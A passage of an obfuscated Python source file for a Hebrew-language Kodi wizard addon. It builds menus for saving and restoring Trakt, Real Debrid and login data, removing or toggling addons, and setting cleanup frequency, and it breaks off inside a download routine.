	addFile ('%s שמירת הרחבות שהתקנתי:  '%O0OOO00OOO000O0O0 .replace ('true',O000O0OOO000000OO ).replace ('false',O0OO0O0OO0OOO0O00 ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:3128
	addFile ('%s שמירת סיסמאות, חשבונות ,מיקומי הורדות:  '%OO0OOO0000OO0O0OO .replace ('true',O000O0OOO000000OO ).replace ('false',O0OO0O0OO0OOO0O00 ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:3129
	addFile ('%s שמירת ספריית סרטים וסדרות:  '%OO00O0OO0O0000OOO .replace ('true',O000O0OOO000000OO ).replace ('false',O0OO0O0OO0OOO0O00 ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:3132
	addFile ('%s שמירת מקורות וידאו:  '%OOO0OOOOO00OO0OO0 .replace ('true',O000O0OOO000000OO ).replace ('false',O0OO0O0OO0OOO0O00 ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:3133
	addFile ('%s שמירת הגדרות סאונד ורזולוציה:  '%OO00OO000OOO000OO .replace ('true',O000O0OOO000000OO ).replace ('false',O0OO0O0OO0OOO0O00 ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:3134
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה  : '%OO0O0O00000OO0OOO .replace ('true',O000O0OOO000000OO ).replace ('false',O0OO0O0OO0OOO0O00 ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:3136
	addFile ('%s שמירת פליליסט לאודר:  '%OOOOO0OOO00000000 .replace ('true',O000O0OOO000000OO ).replace ('false',O0OO0O0OO0OOO0O00 ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:3137
	addFile ('%s שמירת הגדרות באפר: '%O0OOO0O0OO000OO00 .replace ('true',O000O0OOO000000OO ).replace ('false',O0OO0O0OO0OOO0O00 ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:3142
	addFile ('%s שמירת רשימות ריפו:  '%O00O0OO0OOOO00O0O .replace ('true',O000O0OOO000000OO ).replace ('false',O0OO0O0OO0OOO0O00 ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:3144
	setView ('files','viewType')#line:3146
def traktMenu ():#line:3148
	O00OO000O00OOOO0O ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:3149
	OOO0OOOOO00O00O00 =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:3150
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:3151
	addFile ('Save Trakt Data: %s'%O00OO000O00OOOO0O ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:3152
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (OOO0OOOOO00O00O00 ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3153
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3154
	for O00OO000O00OOOO0O in traktit .ORDER :#line:3156
		OOO00OO00OO0O00O0 =TRAKTID [O00OO000O00OOOO0O ]['name']#line:3157
		O0OO00O000000OOOO =TRAKTID [O00OO000O00OOOO0O ]['path']#line:3158
		OOOO000O000OO0OO0 =TRAKTID [O00OO000O00OOOO0O ]['saved']#line:3159
		O0OOOOO000000OOOO =TRAKTID [O00OO000O00OOOO0O ]['file']#line:3160
		OO000OOOO00O0O00O =wiz .getS (OOOO000O000OO0OO0 )#line:3161
		OOO0000OO00O0OO00 =traktit .traktUser (O00OO000O00OOOO0O )#line:3162
		OO0OOO0O00OO00OO0 =TRAKTID [O00OO000O00OOOO0O ]['icon']if os .path .exists (O0OO00O000000OOOO )else ICONTRAKT #line:3163
		O000000000O00O0OO =TRAKTID [O00OO000O00OOOO0O ]['fanart']if os .path .exists (O0OO00O000000OOOO )else FANART #line:3164
		O00O00O00O00OO0OO =createMenu ('saveaddon','Trakt',O00OO000O00OOOO0O )#line:3165
		OO0OO0OOOOO0O0OO0 =createMenu ('save','Trakt',O00OO000O00OOOO0O )#line:3166
		O00O00O00O00OO0OO .append ((THEME2 %'%s Settings'%OOO00OO00OO0O00O0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,O00OO000O00OOOO0O )))#line:3167
		addFile ('[+]-> %s'%OOO00OO00OO0O00O0 ,'',icon =OO0OOO0O00OO00OO0 ,fanart =O000000000O00O0OO ,themeit =THEME3 )#line:3169
		if not os .path .exists (O0OO00O000000OOOO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OO0OOO0O00OO00OO0 ,fanart =O000000000O00O0OO ,menu =O00O00O00O00OO0OO )#line:3170
		elif not OOO0000OO00O0OO00 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',O00OO000O00OOOO0O ,icon =OO0OOO0O00OO00OO0 ,fanart =O000000000O00O0OO ,menu =O00O00O00O00OO0OO )#line:3171
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OOO0000OO00O0OO00 ,'authtrakt',O00OO000O00OOOO0O ,icon =OO0OOO0O00OO00OO0 ,fanart =O000000000O00O0OO ,menu =O00O00O00O00OO0OO )#line:3172
		if OO000OOOO00O0O00O =="":#line:3173
			if os .path .exists (O0OOOOO000000OOOO ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',O00OO000O00OOOO0O ,icon =OO0OOO0O00OO00OO0 ,fanart =O000000000O00O0OO ,menu =OO0OO0OOOOO0O0OO0 )#line:3174
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',O00OO000O00OOOO0O ,icon =OO0OOO0O00OO00OO0 ,fanart =O000000000O00O0OO ,menu =OO0OO0OOOOO0O0OO0 )#line:3175
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OO000OOOO00O0O00O ,'',icon =OO0OOO0O00OO00OO0 ,fanart =O000000000O00O0OO ,menu =OO0OO0OOOOO0O0OO0 )#line:3176
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3178
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3179
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3180
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3181
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3182
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3183
	setView ('files','viewType')#line:3184
def realMenu ():#line:3186
	OOO0OO0O0OO00OO00 ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:3187
	O0O00000OO000OOOO =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:3188
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:3189
	addFile ('Save Real Debrid Data: %s'%OOO0OO0O0OO00OO00 ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:3190
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (O0O00000OO000OOOO ),'',icon =ICONREAL ,themeit =THEME3 )#line:3191
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:3192
	for O00000O00000O0000 in debridit .ORDER :#line:3194
		OO0OO00OOO0OOOOOO =DEBRIDID [O00000O00000O0000 ]['name']#line:3195
		O000OO000O00OO000 =DEBRIDID [O00000O00000O0000 ]['path']#line:3196
		OOO0O00O0OOO00OO0 =DEBRIDID [O00000O00000O0000 ]['saved']#line:3197
		OOO0OO00O0OOOO0OO =DEBRIDID [O00000O00000O0000 ]['file']#line:3198
		OO000O00O0OOO000O =wiz .getS (OOO0O00O0OOO00OO0 )#line:3199
		O00OOOOOOO00OOOOO =debridit .debridUser (O00000O00000O0000 )#line:3200
		OOOOO00OOOO0OOO00 =DEBRIDID [O00000O00000O0000 ]['icon']if os .path .exists (O000OO000O00OO000 )else ICONREAL #line:3201
		O0OO0OO000OO0O0O0 =DEBRIDID [O00000O00000O0000 ]['fanart']if os .path .exists (O000OO000O00OO000 )else FANART #line:3202
		O0O00000O0O0O0O00 =createMenu ('saveaddon','Debrid',O00000O00000O0000 )#line:3203
		O00O0O00OO0O000OO =createMenu ('save','Debrid',O00000O00000O0000 )#line:3204
		O0O00000O0O0O0O00 .append ((THEME2 %'%s Settings'%OO0OO00OOO0OOOOOO ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,O00000O00000O0000 )))#line:3205
		addFile ('[+]-> %s'%OO0OO00OOO0OOOOOO ,'',icon =OOOOO00OOOO0OOO00 ,fanart =O0OO0OO000OO0O0O0 ,themeit =THEME3 )#line:3207
		if not os .path .exists (O000OO000O00OO000 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOOOO00OOOO0OOO00 ,fanart =O0OO0OO000OO0O0O0 ,menu =O0O00000O0O0O0O00 )#line:3208
		elif not O00OOOOOOO00OOOOO :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',O00000O00000O0000 ,icon =OOOOO00OOOO0OOO00 ,fanart =O0OO0OO000OO0O0O0 ,menu =O0O00000O0O0O0O00 )#line:3209
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O00OOOOOOO00OOOOO ,'authdebrid',O00000O00000O0000 ,icon =OOOOO00OOOO0OOO00 ,fanart =O0OO0OO000OO0O0O0 ,menu =O0O00000O0O0O0O00 )#line:3210
		if OO000O00O0OOO000O =="":#line:3211
			if os .path .exists (OOO0OO00O0OOOO0OO ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',O00000O00000O0000 ,icon =OOOOO00OOOO0OOO00 ,fanart =O0OO0OO000OO0O0O0 ,menu =O00O0O00OO0O000OO )#line:3212
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',O00000O00000O0000 ,icon =OOOOO00OOOO0OOO00 ,fanart =O0OO0OO000OO0O0O0 ,menu =O00O0O00OO0O000OO )#line:3213
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OO000O00O0OOO000O ,'',icon =OOOOO00OOOO0OOO00 ,fanart =O0OO0OO000OO0O0O0 ,menu =O00O0O00OO0O000OO )#line:3214
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3216
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3217
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3218
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3219
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3220
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3221
	setView ('files','viewType')#line:3222
def loginMenu ():#line:3224
	OO0O0OO0O00O00O00 ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3225
	OOO0OO0OOOOOO00OO =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3226
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3227
	addFile ('Save Login Data: %s'%OO0O0OO0O00O00O00 ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3228
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (OOO0OO0OOOOOO00OO ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3229
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3230
	for OO0O0OO0O00O00O00 in loginit .ORDER :#line:3232
		O0O0O0O00O0O000O0 =LOGINID [OO0O0OO0O00O00O00 ]['name']#line:3233
		O0OOOO0O00OOOO0O0 =LOGINID [OO0O0OO0O00O00O00 ]['path']#line:3234
		OO0O0000O0O0O00O0 =LOGINID [OO0O0OO0O00O00O00 ]['saved']#line:3235
		O00000OO0OO0OO000 =LOGINID [OO0O0OO0O00O00O00 ]['file']#line:3236
		OOOOO00O000O0OO0O =wiz .getS (OO0O0000O0O0O00O0 )#line:3237
		OOOO0OOO0OOO00OOO =loginit .loginUser (OO0O0OO0O00O00O00 )#line:3238
		OO0O0OOOO0O000OOO =LOGINID [OO0O0OO0O00O00O00 ]['icon']if os .path .exists (O0OOOO0O00OOOO0O0 )else ICONLOGIN #line:3239
		O000OOO0O00O00000 =LOGINID [OO0O0OO0O00O00O00 ]['fanart']if os .path .exists (O0OOOO0O00OOOO0O0 )else FANART #line:3240
		O00OOOOO000O00OOO =createMenu ('saveaddon','Login',OO0O0OO0O00O00O00 )#line:3241
		O00OO00000O00OO0O =createMenu ('save','Login',OO0O0OO0O00O00O00 )#line:3242
		O00OOOOO000O00OOO .append ((THEME2 %'%s Settings'%O0O0O0O00O0O000O0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,OO0O0OO0O00O00O00 )))#line:3243
		addFile ('[+]-> %s'%O0O0O0O00O0O000O0 ,'',icon =OO0O0OOOO0O000OOO ,fanart =O000OOO0O00O00000 ,themeit =THEME3 )#line:3245
		if not os .path .exists (O0OOOO0O00OOOO0O0 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OO0O0OOOO0O000OOO ,fanart =O000OOO0O00O00000 ,menu =O00OOOOO000O00OOO )#line:3246
		elif not OOOO0OOO0OOO00OOO :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',OO0O0OO0O00O00O00 ,icon =OO0O0OOOO0O000OOO ,fanart =O000OOO0O00O00000 ,menu =O00OOOOO000O00OOO )#line:3247
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OOOO0OOO0OOO00OOO ,'authlogin',OO0O0OO0O00O00O00 ,icon =OO0O0OOOO0O000OOO ,fanart =O000OOO0O00O00000 ,menu =O00OOOOO000O00OOO )#line:3248
		if OOOOO00O000O0OO0O =="":#line:3249
			if os .path .exists (O00000OO0OO0OO000 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',OO0O0OO0O00O00O00 ,icon =OO0O0OOOO0O000OOO ,fanart =O000OOO0O00O00000 ,menu =O00OO00000O00OO0O )#line:3250
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',OO0O0OO0O00O00O00 ,icon =OO0O0OOOO0O000OOO ,fanart =O000OOO0O00O00000 ,menu =O00OO00000O00OO0O )#line:3251
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OOOOO00O000O0OO0O ,'',icon =OO0O0OOOO0O000OOO ,fanart =O000OOO0O00O00000 ,menu =O00OO00000O00OO0O )#line:3252
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3254
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3255
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3256
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3257
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3258
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3259
	setView ('files','viewType')#line:3260
def fixUpdate ():#line:3262
	if KODIV <17 :#line:3263
		O00O00O00000O000O =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3264
		try :#line:3265
			os .remove (O00O00O00000O000O )#line:3266
		except Exception as O0O0OOOOOO00OO000 :#line:3267
			wiz .log ("Unable to remove %s, Purging DB"%O00O00O00000O000O )#line:3268
			wiz .purgeDb (O00O00O00000O000O )#line:3269
	else :#line:3270
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3271
def removeAddonMenu ():#line:3273
	OOO0O00000O00O000 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3274
	OOO0OOO0000000OOO =[];O0O0OO0O000000O00 =[]#line:3275
	for O0O00OO00O0000OOO in sorted (OOO0O00000O00O000 ,key =lambda O0OO000O0O0O00OO0 :O0OO000O0O0O00OO0 ):#line:3276
		O0OO0O000OO00OO0O =os .path .split (O0O00OO00O0000OOO [:-1 ])[1 ]#line:3277
		if O0OO0O000OO00OO0O in EXCLUDES :continue #line:3278
		elif O0OO0O000OO00OO0O in DEFAULTPLUGINS :continue #line:3279
		elif O0OO0O000OO00OO0O =='packages':continue #line:3280
		O0O0O0000O00OOOOO =os .path .join (O0O00OO00O0000OOO ,'addon.xml')#line:3281
		if os .path .exists (O0O0O0000O00OOOOO ):#line:3282
			OOO0OOO0O0O000000 =open (O0O0O0000O00OOOOO )#line:3283
			OOOO000O00O0000OO =OOO0OOO0O0O000000 .read ()#line:3284
			O0O0OO0000OOO0000 =wiz .parseDOM (OOOO000O00O0000OO ,'addon',ret ='id')#line:3285
			O00000O0O000OOO0O =O0OO0O000OO00OO0O if len (O0O0OO0000OOO0000 )==0 else O0O0OO0000OOO0000 [0 ]#line:3287
			try :#line:3288
				OO0O0OOO0000O0OOO =xbmcaddon .Addon (id =O00000O0O000OOO0O )#line:3289
				OOO0OOO0000000OOO .append (OO0O0OOO0000O0OOO .getAddonInfo ('name'))#line:3290
				O0O0OO0O000000O00 .append (O00000O0O000OOO0O )#line:3291
			except :#line:3292
				pass #line:3293
	if len (OOO0OOO0000000OOO )==0 :#line:3294
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3295
		return #line:3296
	if KODIV >16 :#line:3297
		OO0OOO0OO0O000O0O =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,OOO0OOO0000000OOO )#line:3298
	else :#line:3299
		OO0OOO0OO0O000O0O =[];OO00OO000O0O000OO =0 #line:3300
		O0000000OOO0OO0OO =["-- Click here to Continue --"]+OOO0OOO0000000OOO #line:3301
		while not OO00OO000O0O000OO ==-1 :#line:3302
			OO00OO000O0O000OO =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,O0000000OOO0OO0OO )#line:3303
			if OO00OO000O0O000OO ==-1 :break #line:3304
			elif OO00OO000O0O000OO ==0 :break #line:3305
			else :#line:3306
				OOOO0OOOO000OOO0O =(OO00OO000O0O000OO -1 )#line:3307
				if OOOO0OOOO000OOO0O in OO0OOO0OO0O000O0O :#line:3308
					OO0OOO0OO0O000O0O .remove (OOOO0OOOO000OOO0O )#line:3309
					O0000000OOO0OO0OO [OO00OO000O0O000OO ]=OOO0OOO0000000OOO [OOOO0OOOO000OOO0O ]#line:3310
				else :#line:3311
					OO0OOO0OO0O000O0O .append (OOOO0OOOO000OOO0O )#line:3312
					O0000000OOO0OO0OO [OO00OO000O0O000OO ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,OOO0OOO0000000OOO [OOOO0OOOO000OOO0O ])#line:3313
	if OO0OOO0OO0O000O0O ==None :return #line:3314
	if len (OO0OOO0OO0O000O0O )>0 :#line:3315
		wiz .addonUpdates ('set')#line:3316
		for O000OOO0O0OOO00OO in OO0OOO0OO0O000O0O :#line:3317
			removeAddon (O0O0OO0O000000O00 [O000OOO0O0OOO00OO ],OOO0OOO0000000OOO [O000OOO0O0OOO00OO ],True )#line:3318
		xbmc .sleep (1000 )#line:3320
		if INSTALLMETHOD ==1 :O000OOOO000000000 =1 #line:3322
		elif INSTALLMETHOD ==2 :O000OOOO000000000 =0 #line:3323
		else :O000OOOO000000000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3324
		if O000OOOO000000000 ==1 :wiz .reloadFix ('remove addon')#line:3325
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3326
def removeAddonDataMenu ():#line:3328
	if os .path .exists (ADDOND ):#line:3329
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3330
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3331
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3332
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3333
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3334
		OOO0OOO0O00O00OO0 =glob .glob (os .path .join (ADDOND ,'*/'))#line:3335
		for O00OO0O0OO00O00O0 in sorted (OOO0OOO0O00O00OO0 ,key =lambda O0000OO0OOO0OOO0O :O0000OO0OOO0OOO0O ):#line:3336
			O0OOOO000OO000000 =O00OO0O0OO00O00O0 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3337
			O0O0OOO0O00O0O000 =os .path .join (O00OO0O0OO00O00O0 .replace (ADDOND ,ADDONS ),'icon.png')#line:3338
			O00OOOOOOOOO0OO0O =os .path .join (O00OO0O0OO00O00O0 .replace (ADDOND ,ADDONS ),'fanart.png')#line:3339
			O0OOO0OOO00OO00O0 =O0OOOO000OO000000 #line:3340
			OOOO00O0O00OO00O0 ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3341
			for O0OOOO0OOOO0O0OO0 in OOOO00O0O00OO00O0 :#line:3342
				O0OOO0OOO00OO00O0 =O0OOO0OOO00OO00O0 .replace (O0OOOO0OOOO0O0OO0 ,OOOO00O0O00OO00O0 [O0OOOO0OOOO0O0OO0 ])#line:3343
			if O0OOOO000OO000000 in EXCLUDES :O0OOO0OOO00OO00O0 ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%O0OOO0OOO00OO00O0 #line:3344
			else :O0OOO0OOO00OO00O0 ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%O0OOO0OOO00OO00O0 #line:3345
			addFile (' %s'%O0OOO0OOO00OO00O0 ,'removedata',O0OOOO000OO000000 ,icon =O0O0OOO0O00O0O000 ,fanart =O00OOOOOOOOO0OO0O ,themeit =THEME2 )#line:3346
	else :#line:3347
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3348
	setView ('files','viewType')#line:3349
def enableAddons ():#line:3351
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3352
	O0O0OO00O0OO0OOOO =glob .glob (os .path .join (ADDONS ,'*/'))#line:3353
	OO00OO00OO0O0OO00 =0 #line:3354
	for O00OO000000000OO0 in sorted (O0O0OO00O0OO0OOOO ,key =lambda OOO0O0O0O0OOO0OOO :OOO0O0O0O0OOO0OOO ):#line:3355
		OOO0O0O00O0OO0OO0 =os .path .split (O00OO000000000OO0 [:-1 ])[1 ]#line:3356
		if OOO0O0O00O0OO0OO0 in EXCLUDES :continue #line:3357
		if OOO0O0O00O0OO0OO0 in DEFAULTPLUGINS :continue #line:3358
		OOOOOO0OOO0000OOO =os .path .join (O00OO000000000OO0 ,'addon.xml')#line:3359
		if os .path .exists (OOOOOO0OOO0000OOO ):#line:3360
			OO00OO00OO0O0OO00 +=1 #line:3361
			O0O0OO00O0OO0OOOO =O00OO000000000OO0 .replace (ADDONS ,'')[1 :-1 ]#line:3362
			OO0O00OO00OOOOO00 =open (OOOOOO0OOO0000OOO )#line:3363
			OOO000O00OOOO0OOO =OO0O00OO00OOOOO00 .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3364
			O000O00O0O00O00O0 =wiz .parseDOM (OOO000O00OOOO0OOO ,'addon',ret ='id')#line:3365
			O00O0O0O0OO0O0O00 =wiz .parseDOM (OOO000O00OOOO0OOO ,'addon',ret ='name')#line:3366
			try :#line:3367
				OOO000O0O0OO00OO0 =O000O00O0O00O00O0 [0 ]#line:3368
				O0000OOO00O00O0O0 =O00O0O0O0OO0O0O00 [0 ]#line:3369
			except :#line:3370
				continue #line:3371
			try :#line:3372
				O0OO0OOOO00O0O000 =xbmcaddon .Addon (id =OOO000O0O0OO00OO0 )#line:3373
				O0OOOOOO00000OOO0 ="[COLOR green][Enabled][/COLOR]"#line:3374
				OOO00O00O0OOOOOO0 ="false"#line:3375
			except :#line:3376
				O0OOOOOO00000OOO0 ="[COLOR red][Disabled][/COLOR]"#line:3377
				OOO00O00O0OOOOOO0 ="true"#line:3378
				pass #line:3379
			OO00O0O000OOO00O0 =os .path .join (O00OO000000000OO0 ,'icon.png')if os .path .exists (os .path .join (O00OO000000000OO0 ,'icon.png'))else ICON #line:3380
			O0OO0000O0OO000OO =os .path .join (O00OO000000000OO0 ,'fanart.jpg')if os .path .exists (os .path .join (O00OO000000000OO0 ,'fanart.jpg'))else FANART #line:3381
			addFile ("%s %s"%(O0OOOOOO00000OOO0 ,O0000OOO00O00O0O0 ),'toggleaddon',O0O0OO00O0OO0OOOO ,OOO00O00O0OOOOOO0 ,icon =OO00O0O000OOO00O0 ,fanart =O0OO0000O0OO000OO )#line:3382
			OO0O00OO00OOOOO00 .close ()#line:3383
	if OO00OO00OO0O0OO00 ==0 :#line:3384
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3385
	setView ('files','viewType')#line:3386
def changeFeq ():#line:3388
	O0O0OOOO0O0O00O0O =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3389
	OOOO0000OOOOO00O0 =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,O0O0OOOO0O0O00O0O )#line:3390
	if not OOOO0000OOOOO00O0 ==-1 :#line:3391
		wiz .setS ('autocleanfeq',str (OOOO0000OOOOO00O0 ))#line:3392
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,O0O0OOOO0O0O00O0O [OOOO0000OOOOO00O0 ]))#line:3393
def developer ():#line:3395
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3396
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3397
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3398
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3399
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3400
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3401
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3402
	setView ('files','viewType')#line:3404
def download (O0000OOO0OO00OO0O ,OO0O0OO00OOO0O000 ):#line:3409
  OO0OOO0OO0OO0O00O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3410
  OOOOO0O000O00O000 =xbmcgui .DialogProgress ()#line:3411
  OOOOO0O000O00O000 .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3412
  O0OOO0000O0O0O00O =os .path .join (OO0OOO0OO0OO0O00O ,'isr.zip')#line:3413
  O0O00O0O0OOOO00OO =urllib2 .Request (O0000OOO0OO00OO0O )#line:3414
  OOO000OOOOOO0OOOO =urllib2 .urlopen (O0O00O0O0OOOO00OO )#line:3415
  OOOOOOO0OOO0OO0O0 =xbmcgui .DialogProgress ()#line:3417
  OOOOOOO0OOO0OO0O0 .create ("Downloading","Downloading "+name )#line:3418
  OOOOOOO0OOO0OO0O0 .update (0 )#line:3419
  OOO00O0OO0OOO0OO0 =OO0O0OO00OOO0O000 #line:3420
  OO0000O00OO0000O0 =open (O0OOO0000O0O0O00O ,'wb')#line:3421
  try :#line:3423
    OO0O0O000O0OO00OO =OOO000OOOOOO0OOOO .info ().getheader ('Content-Length').strip ()#line:3424
    O00OO0O0OO0O00O0O =True #line:3425
  except AttributeError :#line:3426
        O00OO0O0OO0O00O0O =False #line:3427
  if O00OO0O0OO0O00O0O :#line:3429
        OO0O0O000O0OO00OO =int (OO0O0O000O0OO00OO )#line:3430
  O00O0OO00000O00O0 =0 #line:3432
  OOO000O00O0O00000 =time .time ()#line:3433
  while True :#line:3434
        O0O000O00O0O00OO0 =OOO000OOOOOO0OOOO .read (8192 )#line:3435
